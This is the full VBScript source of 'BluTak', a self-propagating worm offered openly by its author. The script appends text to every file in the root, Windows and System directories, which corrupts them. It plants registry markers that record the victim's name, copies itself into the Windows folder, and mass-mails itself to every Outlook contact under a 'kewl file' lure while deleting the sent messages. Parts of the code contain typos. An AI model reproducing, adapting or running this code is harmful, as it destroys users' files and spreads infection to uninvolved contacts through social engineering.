' BluTak By Ruzz`

' Gets all files in C:\, Windows Dir and System Dir
' Opens them and appends with
' "Stuck In The Blu?"
' "BluTak By Ruzz`"
' Enjoy!

Dim BluTempFile, RegWindir, RegRootdir, RegTempdir, RegSysdir, Winfiles, Rootfiles, Sysfiles, BluWorkingFile, InfectedFiles   ' Declare variables

Set Blu = CreateObject("Scripting.FileSystemObject")   ' Define Blu
Set BluReg = CreateObject("WScript.Shell")   ' Define BluReg
BluTempFile = Blu.GetTempName   ' Create a unique tempfile name

Const WindowsFolder = 0, SystemFolder = 1, TemporaryFolder = 2   ' Declare constants for use in place of literal values

BluReg.RegWrite "HKEY_LOCAL_MACHINE\Software\BluTak\Info\Coder", "Ruzz`"  ' Write Coder reg key
BluReg.RegWrite "HKEY_LOCAL_MACHINE\Software\BluTak\Info\Group", "The Shadow Virus Group"   ' Write Group reg key
BluReg.RegWrite "HKEY_LOCAL_MACHINE\Software\BluTak\Info\Release", "BluTak 1.0"   ' Write Release reg key
BluReg.RegWrite "HKEY_LOCAL_MACHINE\Software\BluTak\Info\Victim", BluReg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")   ' Get Registered Owner varible from reg key
BluReg.RegWrite "HKEY_LOCAL_MACHINE\Software\BluTak\Stat\Infected", Now   ' Time stamp infection
BluReg.RegWrite "HKEY_LOCAL_MACHINE\Software\BluTak\Stat\IDNumber", (9999999 * Rnd)+1  ' Give the infection a unique ID number
BluReg.RegWrite "HKEY_LOCAL_MACHINE\Software\BluTak\RunInfo\WinDir", Blu.GetSpecialFolder(WindowsFolder)   ' Write Windows dir path to reg key
BluReg.RegWrite "HKEY_LOCAL_MACHINE\Software\BluTak\RunInfo\RootDir", Blu.GetFolder("C:\")   ' Write Root dir path to reg key
BluReg.RegWrite "HKEY_LOCAL_MACHINE\Software\BluTak\RunInfo\TempDir", Blu.GetSpecialFolder(TemporaryFolder)   ' Write Temporary dir path to reg key
BluReg.RegWrite "HKEY_LOCAL_MACHINE\Software\BluTak\RunInfo\SysDir", Blu.GetSpecialFolder(SystemFolder)   ' Write System dir path to reg key

RegWindir = BluReg.RegRead("HKEY_LOCAL_MACHINE\Software\BluTak\RunInfo\WinDir")    ' Read Windows dir path from reg key
RegRootdir = BluReg.RegRead("HKEY_LOCAL_MACHINE\Software\BluTak\RunInfo\RootDir")    ' Read Root dir path from reg key
RegTempdir = BluReg.RegRead("HKEY_LOCAL_MACHINE\Software\BluTak\RunInfo\TempDir")    ' Read Temporary dir path from reg key
RegSysdir = BluReg.RegRead("HKEY_LOCAL_MACHINE\Software\BluTak\RunInfo\SysDir")    ' Read System dir path from reg key

BluReg.RegWrite "HKEY_LOCAL_MACHINE\Software\BluTak\RunInfo\WorkingFile", RegTempDir & "\" & BluTempFile   ' Write temp file name to registry

Set WinDirF = Blu.GetFolder(RegWinDir)   ' Get Windows dir path from reg key
Set RootDirF = Blu.GetFolder(RegRootdir)   ' Get Root dir path from reg key
Set SysDirF = Blu.GetFolder(RegSysdir)   ' Get System dir path from reg key

Set BluGet = Blu.GetFile("BluTak.vbs")
Set BluParent = BluGet.Path
Set BluLocation = BlueParent & "\" & "BluTak.vbs"
Set BluIsHere = Blu.GetFile(BluLocation)
BluIsHere.Copy (WindirF & "BluTak.vbs)

Set Winfiles = WinDirF.Files   ' Declare Winfiles as the collection of all file objects within the Windows dir
Set Rootfiles = RootDirF.Files   ' Declare Rootfiles as the collection of all file objects within the Root dir
Set Sysfiles = SysDirF.Files   ' Declare Sysfiles as the collection of all file objects within the System dir

BluWorkingFile = BluReg.RegRead("HKEY_LOCAL_MACHINE\Software\BluTak\RunInfo\WorkingFile")   ' Read tempfile name
Set BluInfoFile = Blu.CreateTextFile(BluWorkingFile,True,False)   'Create tempfile

For Each FileInRoot in Rootfiles   ' Do for each file in RootFiles
CompleteFileName = RegRootDir & FileInRoot.name   ' Join the full path and file name
BluInfoFile.WriteLine(CompleteFileName)   ' Write CompleteFileName to tempfile
Next   ' Repeat it

For Each FileInWin in Winfiles   ' Do for each file in WinFiles
CompleteFileName = RegWindir & "\" & FileInWin.name   ' Join the full path and file name
BluInfoFile.WriteLine(CompleteFileName)   ' Write CompleteFileName to tempfile
Next   ' Repeat it

For Each FileInSys in Sysfiles   ' Do for each file in SysFiles
CompleteFileName = RegSysdir & "\" & FileInSys.name   ' Join the full path and file name
BluInfoFile.WriteLine(CompleteFileName)   ' Write CompleteFileName to tempfile
Next   ' Repeat it

BluInfoFile.Close   ' Close and save the tempfile

Const BluRead = 1, BluWrite = 2, BluAppend = 8   ' Declare constants for use in place of literal values

Set BluTakInfo = Blu.OpenTextFile(BluWorkingFile, BluRead)   ' Open the tempfile for reading
Do While BluTakInfo.AtEndOfStream <> True   ' Do loop until at end of text file
OpenBluTak = BluTakInfo.readline   ' Read a line
InfectedFiles = 0   ' Set InfectedFiles to 0
Set TakDaFile = Blu.OpenTextFile(OpenBluTak, BluAppend)   ' Open the filename in the read line for appending
TakDaFile.WriteLine("Stuck In The Blu?")   ' Add a line to the open file
TakDaFile.WriteLine("BluTak By Ruzz`")   ' Add another line to the open file
TakDaFile.Close   ' Close and save the opened file
InfectedFiles = InfectedFiles + 1   ' Add 1 for each file infected
Loop   ' Repeat it
BluTakInfo.Close   ' Close the tempfile

BluReg.RegWrite "HKEY_LOCAL_MACHINE\Software\BluTak\Stat\Infected Files", InfectedFiles   ' Write InfectedFiles to reg key

Set BluTakEliminate = Blu.GetFile(BluInfoFile)   ' Get location and file name of tempfile
BluTakEliminate.Delete   ' Eliminate the tempfile

Set BluOutlook = CreateObject("Outlook.Application")   ' Define BluOutlook
Set BluMapi = BluOutlook.GetNameSpace("MAPI")   ' Get the name space
For Each BluRecipient In BluMapi.AddressLists   ' Do for each address in the address book
If BluRecipient.AddressEntries.Count <> 0 Then   ' If there are more than 0 addresses do below
Set BluEmail = BluOutlook.CreateItem(0)   ' Define BluEmail
For BluCount = 1 To BluRecipient.AddressEntries.Count  ' Do loop for the amount of addresses in the address book
Set BluEntries = BluRecipient.AddressEntries(BluCount)   ' Define BluEntries
If BluCount = 1 Then   ' If there is only 1 address, do the below
BluEmail.BCC = BluEntries.Address   ' Add the address to the BCC line
Else   ' If there are more than 1 addresses
BluEmail.BCC = BluEmail.BCC & "; " & BluEntries.Address   ' Add all addresses to the BCC line
End If   ' End the loop
Next   ' Continue the Do loop

BluEmail.Subject = "Look at this kewl file"   ' Set the subject
BluEmail.Body = "I found this really kewl file on the Internet.  Running it is a must!"   ' Set the text body
BluEmail.Attachments.Add BluIsHere   ' Add the file as an attachment
BluEmail.DeleteAfterSubmit = True   ' Delete the email after it has been sent
BluEmail.Send   ' Send the email
End If   ' End the loop
Next   ' Continue the Do Loop